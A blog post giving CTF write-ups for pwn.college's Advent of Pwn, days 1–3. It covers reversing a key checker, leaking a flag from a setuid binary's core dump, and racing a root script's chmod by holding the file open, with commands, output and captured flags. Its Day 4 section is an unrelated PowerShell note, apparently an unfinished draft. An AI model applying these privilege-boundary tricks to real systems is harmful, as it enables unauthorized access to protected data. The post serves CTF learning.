---
title:  "[CTF] PWN.COLLEGE - Advent of Pwn."
categories: [CTF, pwn.college]
---

![Logo](/assets/images/santa-cyber.png)

[Advent of Pwn](https://pwn.college/advent-of-pwn/) is an Advent CTF created by the awesome team at [ASU](https://www.asu.edu) behind [pwn.college](http://pwn.college/). This year was its first edtion. In this post I'll go through my solutions and share some of the things I've learnt along the way. Having time available mostly at odd evening hours, I finished only 9/12 challenges during the CTF and worked on the rest of them later. If you haven't stumbled upon [other](https://www.feyrer.de/CTF/CTF-Writeup-pwn.college-AdventOfPwn2025/) [solutions](https://jia.je/ctf-writeups/2025-12-01-advent-of-pwn-2025/) [already](https://github.com/hidehiroanto/ctf-writeups/tree/main/advent-of-pwn/2025) before landing on this page, please do check them out as you might find some more elegant ideas from seasoned CTF players. Especially for levels 5, which was a bit trickier, and 6 which had multiple solutions.  

Before going into the technical solutions, a few words about LLMs, which seem to be the theme nowadays. During the CTF I relied on LLMs for a couple of tasks which I believe they proved really useful at:
* Making sense of large amounts of code, high level or disassembly.
* Getting started with complicated subjects (e.g. understanding a custom blockchain).
* Repetitive tasks when speed or code quality is not a concern.

Multiple friends I've talked to during the CTF were skeptic about using LLMs and I definitely understand why. Some drawbacks I've experienced _continously_, not just during this CTF but in general:
* It's really easy to get directed to rabbit holes or ideas that don't lead anywhere.
* Very often they miss good ideas.
* They suggest paths which appear correct and seem to make sense, but are either very inefficient or simply wrong.
* On advanced topics, or things for which simply there's not much information available (for example level 5 shellcode for `io_uring` async I/O here), no amount of vibe-researching will get you to the solution.
* Again, not much chance against esoteric topics like pwn.college's [The Art of the Shell](https://pwn.college/shell-lin-do~148f65dd/) or [Linux Lunacy](https://pwn.college/linux-lunacy~9b739db1/) modules, which are awesome BTW.

Last but definitely not least, huge thanks to the creators of these challenges for the effort of designing and making them available for everyone!

Solutions and all challenge files to follow along are also on [GitHub](https://github.com/livz/advent-of-pwn). Challenge descriptions were fun to read but I think they didn't add much useful information towards solving them. So, for brevity I'm ommiting them here. 

## Day 1 - Warm-up gatekeeper

In this challenge we're dealing with an ELF 😛 file that performs some checks on its input:

```bash
$ file /challenge/check-list
/challenge/check-list: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=de16e5b4aea576aabe09d12729be47c53ff6e586, stripped

$ pwn checksec /challenge/check-list
[*] '/challenge/check-list'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
```

The code is really massive (1M+ lines of disassembly in Ghidra) but quite eays to understand. We're dealing with a large array of input bytes:
```nasm
.text:0000000000401000                 mov     rbp, rsp
.text:0000000000401003                 sub     rsp, 500h
.text:000000000040100A                 mov     eax, 0
.text:000000000040100F                 mov     edi, 0          ; fd
.text:0000000000401014                 lea     rsi, [rbp+var_400] ; buf
.text:000000000040101B                 mov     edx, 400h       ; count
.text:0000000000401020                 syscall                 ; LINUX - sys_read
```

test
```nasm
mov     rbp, rsp
sub     rsp, 500h
```
And thousands of basic operations (`sub` and `add`) applied on each element. Towards the end there are some checks on each array element. If we pass all the checks we get the flag:
```nasm
.text:0000000000AA401C                 jnz     wrong_byte
.text:0000000000AA4022                 cmp     [rbp+var_1], 7Dh ; '}'
.text:0000000000AA4026                 jnz     wrong_byte
.text:0000000000AA402C                 mov     rax, 1
.text:0000000000AA4033                 mov     rdi, 1          ; fd
.text:0000000000AA403A                 lea     rsi, bufCorrectStart ; buf
.text:0000000000AA4041                 mov     rdx, 31h ; '1'  ; count
.text:0000000000AA4048                 syscall                 ; LINUX - sys_write
.text:0000000000AA404A                 mov     eax, 2
.text:0000000000AA404F                 lea     rdi, filename   ; Open flag
.text:0000000000AA4056                 mov     esi, 0          ; flags
.text:0000000000AA405B                 mov     edx, 0          ; mode
.text:0000000000AA4060                 syscall                 ; LINUX - sys_open
.text:0000000000AA4062                 cmp     rax, 0
.text:0000000000AA4066                 jl      short loc_AA40B6
.text:0000000000AA4068                 mov     r12, rax
.text:0000000000AA406B                 mov     eax, 0
.text:0000000000AA4070                 mov     rdi, r12        ; fd
.text:0000000000AA4073                 lea     rsi, [rbp+var_500] ; buf
.text:0000000000AA407A                 mov     edx, 100h       ; count
.text:0000000000AA407F                 syscall                 ; LINUX - sys_read
.text:0000000000AA4081                 cmp     rax, 0
.text:0000000000AA4085                 jle     short loc_AA40B6
.text:0000000000AA4087                 mov     rcx, rax
.text:0000000000AA408A                 mov     rax, 1
.text:0000000000AA4091                 mov     rdi, 1          ; fd
.text:0000000000AA4098                 lea     rsi, [rbp+var_500] ; buf
.text:0000000000AA409F                 mov     rdx, rcx        ; count
.text:0000000000AA40A2                 syscall                 ; LINUX - sys_write
.text:0000000000AA40A4                 cmp     rax, 0
.text:0000000000AA40A8                 jl      short loc_AA40B6
.text:0000000000AA40AA                 mov     eax, 3Ch ; '<'
.text:0000000000AA40AF                 mov     edi, 0          ; error_code
.text:0000000000AA40B4                 syscall                 ; LINUX - sys_exit
```

For this level, once you understand what's happening a simple Python script can parse all the code, extract the operations and final value for each array element and reverse them to get the expected input key:
```python
~ python3 day-01-reconstruct-key.py
--- Key Reconstruction Complete ---
Key length: 1024 bytes

Successfully wrote the reconstructed key to 'reconstructed_key.bin' (binary format).
~ scp reconstructed_key.bin hacker@dojo.pwn.college:/home/hacker
reconstructed_key.bin
```

Then get the flag:
```bash
$ /challenge/check-list < reconstructed_key.bin
✨ Correct: you checked it twice, and it shows!
pwn.college{cqFsdOJjQoO-immwxNL7kN4DOFJ.QX4UDOxIDLzQDMyQzW}
```

## Day 2 - Dumpable SUID binary

Another ELF binary:
```bash
$ pwn checksec /challenge/claus
[*] '/challenge/claus'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

But this time we have its source:
```c
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char gift[256];

void wrap(char *gift, size_t size)
{
    fprintf(stdout, "Wrapping gift: [          ] 0%%");
    for (int i = 0; i < size; i++) {
        sleep(1);
        gift[i] = "#####\n"[i % 6];
        int progress = (i + 1) * 100 / size;
        int bars = progress / 10;
        fprintf(stdout, "\rWrapping gift: [");
        for (int j = 0; j < 10; j++) {
            fputc(j < bars ? '=' : ' ', stdout);
        }
        fprintf(stdout, "] %d%%", progress);
        fflush(stdout);
    }
    fprintf(stdout, "\n🎁 Gift wrapped successfully!\n\n");
}

void sigtstp_handler(int signum)
{
    puts("🎅 Santa won't stop!");
}

int main(int argc, char **argv, char **envp)
{
    uid_t ruid, euid, suid;

    if (getresuid(&ruid, &euid, &suid) == -1) {
        perror("getresuid");
        return 1;
    }

    if (euid != 0) {
        fprintf(stderr, "❌ Error: Santa must wrap as root!\n");
        return 1;
    }

    if (ruid != 0) {
        if (setreuid(0, -1) == -1) {
            perror("setreuid");
            return 1;
        }

        fprintf(stdout, "🦌 Now, Dasher! now, Dancer! now, Prancer and Vixen!\nOn, Comet! on Cupid! on, Donder and Blitzen!\n\n");
        execve("/proc/self/exe", argv, envp);

        perror("execve");
        return 127;
    }

    if (signal(SIGTSTP, sigtstp_handler) == SIG_ERR) {
        perror("signal");
        return 1;
    }

    int fd = open("/flag", O_RDONLY);
    if (fd == -1) {
        perror("open");
        return 1;
    }

    int count = read(fd, gift, sizeof(gift));
    if (count == -1) {
        perror("read");
        return 1;
    }

    wrap(gift, count);

    puts("🎄 Merry Christmas!\n");
    puts(gift);

    return 0;
}
```

Day 2 has a short init script that modifies the pattern for core files, to be in line with the challenge descrption:
```bash
#!/bin/sh

set -eu

mount -o remount,rw /proc/sys
echo coal > /proc/sys/kernel/core_pattern
mount -o remount,ro /proc/sys
```

The plan for this one is straight-forward: trigger a core dump then find the flag, which should still have been in memory. To do that, first make sure to set the core size:
```bash
$ ulimit -c
0
$ ulimit -c unlimited
$ ulimit -c
unlimited
```

There might be other ways but I went for a SIGQUIT (**Ctrl + \**))which triggers a core dump:
```bash
$ /challenge/claus
🦌 Now, Dasher! now, Dancer! now, Prancer and Vixen!
On, Comet! on Cupid! on, Donder and Blitzen!

Wrapping gift: [          ] 1%^\Quit (core dumped)

$ ls -al coal
-rw------- 1 root ubuntu 425984 Dec  2 19:41 coal
```

There are multiple ways to extract the flag as well, but I wanted to see if I could find it in the core using GDB:
```bash
gdb /challenge/claus ~/coal

gef➤  bt
#0  0x00007f51c4d86a7a in clock_nanosleep () from /lib/x86_64-linux-gnu/libc.so.6
#1  0x00007f51c4d93a27 in nanosleep () from /lib/x86_64-linux-gnu/libc.so.6
#2  0x00007f51c4da8c93 in sleep () from /lib/x86_64-linux-gnu/libc.so.6
#3  0x0000557a2330723d in wrap ()
#4  0x0000557a2330755b in main ()

gef➤  x/7i $rip
=> 0x557a2330755b <main+452>:   lea    rax,[rip+0xbf9]        # 0x557a2330815b
   0x557a23307562 <main+459>:   mov    rdi,rax
   0x557a23307565 <main+462>:   call   0x557a23307030 <puts@plt>
   0x557a2330756a <main+467>:   lea    rax,[rip+0x2b4f]        # 0x557a2330a0c0 <gift>
   0x557a23307571 <main+474>:   mov    rdi,rax
   0x557a23307574 <main+477>:   call   0x557a23307030 <puts@plt>
   0x557a23307579 <main+482>:   mov    eax,0x0

gef➤  x/s 0x557a2330a0c0
0x557a2330a0c0 <gift>:  "##n.college{4vYY1y_EKEbWDpks1zEp7C7y8mm.QX4cDOxIDLzQDMyQzW}\n"
```

## Day 3 - Sleeping nicely

<blockquote>
  <p>Only when children sleep sweetly and nice does Santa begin his flight</p>
</blockquote>

Despite having a massive description, this is another short and sweet one. The challenge has an init script which launches the folowing script in the background:

```bash
#!/bin/sh

set -eu

GIFT="$(cat /flag)"
rm /flag

touch /stocking

sleeping_nice() {
    ps ao ni,comm --no-headers \
        | awk '$1 > 0' \
        | grep -q sleep
}

# Only when children sleep sweetly and nice does Santa begin his flight
until sleeping_nice; do
    sleep 0.1
done

chmod 400 /stocking
printf "%s" "$GIFT" > /stocking

```

When nice sleep is detected, Santa will drop the flag, but not before making the stocking unreadble. Naughty! The idea is to open the `/stocking` file before Santa changes its permissions, then sleep nicely:

```bash
$ ls /stocking
-rw-r--r-- 1 root root 0 Dec  3 12:48 /stocking

$ tail -f /stocking
pwn.college{sucGPgrXk1E5Phyq-QhxTqXukrZ.QX0gDOxIDLzQDMyQzW}

- Challenge is already running. Start sleeping nicely

$ nice -n 10 sleep 1
```

## Day 4 - 

<div class="box-note">
Note that <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/out-string?view=powershell-6" target="_blank">Out-String -Stream</a> is very important here. This is needed to be able to use <b>Select-String</b> and grep through the output!
</div>


All the levels were very educative! Huge thanks to the authors.
